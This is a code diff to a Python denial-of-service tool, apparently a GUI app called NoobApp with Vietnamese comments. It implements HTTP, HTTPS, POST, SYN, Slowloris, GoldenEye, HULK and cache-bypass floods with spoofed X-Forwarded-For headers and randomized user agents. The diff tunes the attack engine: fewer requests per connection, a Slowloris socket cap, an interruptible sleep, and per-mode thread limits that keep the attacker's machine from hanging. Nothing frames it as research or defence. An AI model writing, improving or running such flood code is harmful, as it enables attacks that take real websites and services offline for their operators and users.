@@ -168,6 +168,13 @@ def _req(host, keep=True, method="GET"):
             f"Cache-Control: no-cache, no-store\r\nRange: bytes=0-\r\n"
             f"Connection: {conn}\r\n" + _fake_headers() + "\r\n").encode()
 
+# ── interruptible sleep ──────────────────────────────────────────────────────
+def _isleep(secs, stop_ev, step=0.1):
+    """Sleep ngắt được: kiểm tra stop_ev mỗi `step` giây."""
+    end = time.time() + secs
+    while not stop_ev.is_set() and time.time() < end:
+        time.sleep(min(step, end - time.time()))
+
 # ── keep-alive engine ────────────────────────────────────────────────────────
 # Return values:
 #   True     = tất cả count requests gửi thành công
@@ -200,7 +207,7 @@ def _http_flood(host, port, stats, stop_ev):
             method  = random.choice(["GET", "GET", "GET", "POST"])
             payload = _req(host, keep=True, method=method)
             # Fix 1: False do stop_ev là abort có chủ đích, không phải error
-            if _send_keepalive(s, payload, 200, stats, stop_ev) == "error":
+            if _send_keepalive(s, payload, 100, stats, stop_ev) == "error":
                 _inc(stats, "errors")
         except Exception:
             _inc(stats, "errors")
@@ -222,7 +229,7 @@ def _https_flood(host, port, stats, stop_ev):
             s   = ctx.wrap_socket(raw, server_hostname=host)
             method  = random.choice(["GET", "GET", "POST"])
             payload = _req(host, keep=True, method=method)
-            if _send_keepalive(s, payload, 150, stats, stop_ev) == "error":
+            if _send_keepalive(s, payload, 80, stats, stop_ev) == "error":
                 _inc(stats, "errors")
         except Exception:
             _inc(stats, "errors")
@@ -237,7 +244,7 @@ def _post_flood(host, port, stats, stop_ev):
         try:
             s = _make_socket(); s.settimeout(2); s.connect((host, port))
             payload = _req(host, keep=True, method="POST")
-            if _send_keepalive(s, payload, 200, stats, stop_ev) == "error":
+            if _send_keepalive(s, payload, 100, stats, stop_ev) == "error":
                 _inc(stats, "errors")
         except Exception:
             _inc(stats, "errors")
@@ -278,12 +285,13 @@ def _syn_flood(host, port, stats, stop_ev):
                 except: pass
 
 def _slowloris(host, port, stats, stop_ev):
-    # Fix #3: dùng _inc() thay vì stats["sent"] += 1 trực tiếp
+    # 150 sockets per thread — 400 gây FD exhaustion khi nhiều threads.
+    # _isleep thay time.sleep để stop ngay khi cần.
     sockets = []
-    for _ in range(400):
+    for _ in range(150):
         if stop_ev.is_set(): break
         try:
-            s = _make_socket(); s.settimeout(4); s.connect((host, port))
+            s = _make_socket(); s.settimeout(3); s.connect((host, port))
             s.sendall((f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n"
                        f"X-Forwarded-For: {_rip()}\r\nUser-Agent: {random.choice(AGENTS)}\r\n").encode())
             sockets.append(s); _inc(stats, "sent")
@@ -296,12 +304,12 @@ def _slowloris(host, port, stats, stop_ev):
             except:
                 sockets.remove(s); _inc(stats, "errors")
                 try:
-                    ns = _make_socket(); ns.settimeout(4); ns.connect((host, port))
+                    ns = _make_socket(); ns.settimeout(3); ns.connect((host, port))
                     ns.sendall((f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n"
                                 f"X-Forwarded-For: {_rip()}\r\n").encode())
                     sockets.append(ns)
                 except: pass
-        time.sleep(8)
+        _isleep(15, stop_ev)
     for s in sockets:
         try: s.close()
         except: pass
@@ -333,7 +341,7 @@ def _cache_bypass(host, port, stats, stop_ev):
                     f"Cache-Control: no-cache, no-store\r\nPragma: no-cache\r\n"
                     f"User-Agent: {random.choice(AGENTS)}\r\n"
                     + _fake_headers() + "\r\n").encode()
-            if _send_keepalive(s, req, 100, stats, stop_ev) == "error":
+            if _send_keepalive(s, req, 60, stats, stop_ev) == "error":
                 _inc(stats, "errors")
         except Exception:
             _inc(stats, "errors")
@@ -355,7 +363,7 @@ def _goldeneye(host, port, stats, stop_ev):
                 if stop_ev.is_set(): break
                 s.sendall(b"X-padding: " + random.randbytes(64) + b"\r\n")
                 _inc(stats, "sent")
-                time.sleep(0.3)
+                _isleep(0.3, stop_ev)
         except Exception:
             _inc(stats, "errors")
         finally:
@@ -374,7 +382,7 @@ def _hulk(host, port, stats, stop_ev):
                     f"Referer: https://www.google.com/?q={rand}\r\n"
                     f"Connection: keep-alive\r\n"
                     + _fake_headers() + "\r\n").encode()
-            if _send_keepalive(s, req, 200, stats, stop_ev) == "error":
+            if _send_keepalive(s, req, 100, stats, stop_ev) == "error":
                 _inc(stats, "errors")
         except Exception:
             _inc(stats, "errors")
@@ -412,7 +420,7 @@ def _http_https_combined(host, port, stats, stop_ev):
             try:
                 s = _make_socket(); s.settimeout(2); s.connect((host, port))
                 payload = _req(host, keep=True, method=random.choice(["GET","GET","POST"]))
-                if _send_keepalive(s, payload, 200, stats, stop_ev) == "error":
+                if _send_keepalive(s, payload, 100, stats, stop_ev) == "error":
                     _inc(stats, "errors")
             except Exception:
                 _inc(stats, "errors")
@@ -428,7 +436,7 @@ def _http_https_combined(host, port, stats, stop_ev):
                 raw = _make_socket(); raw.settimeout(2); raw.connect((host, port))
                 s   = ctx.wrap_socket(raw, server_hostname=host)
                 payload = _req(host, keep=True, method=random.choice(["GET","GET","POST"]))
-                if _send_keepalive(s, payload, 150, stats, stop_ev) == "error":
+                if _send_keepalive(s, payload, 80, stats, stop_ev) == "error":
                     _inc(stats, "errors")
             except Exception:
                 _inc(stats, "errors")
@@ -1005,6 +1013,17 @@ class NoobApp:
         mode = self._selected_mode()
         fn   = ATTACK_MAP.get(mode)
         if not fn: return
+
+        # Per-mode thread cap — quá nhiều threads cho certain modes gây FD/event-loop exhaustion
+        _MODE_CAPS = {
+            "Slowloris":    10,   # 10t × 150 sockets = 1500 FDs — đủ
+            "HTTP/2 Flood": 50,   # Semaphore(4) handles actual concurrency
+            "GoldenEye":    50,   # sleep(0.3)/loop — không cần nhiều
+        }
+        cap = _MODE_CAPS.get(mode)
+        if cap and total_threads > cap:
+            self._log.add(f"[{mode}] cap threads {total_threads}→{cap} (tránh treo máy)", "warn")
+            total_threads = cap
 
         # HTTP/2 check
         if mode == "HTTP/2 Flood" and not HTTPX_OK:
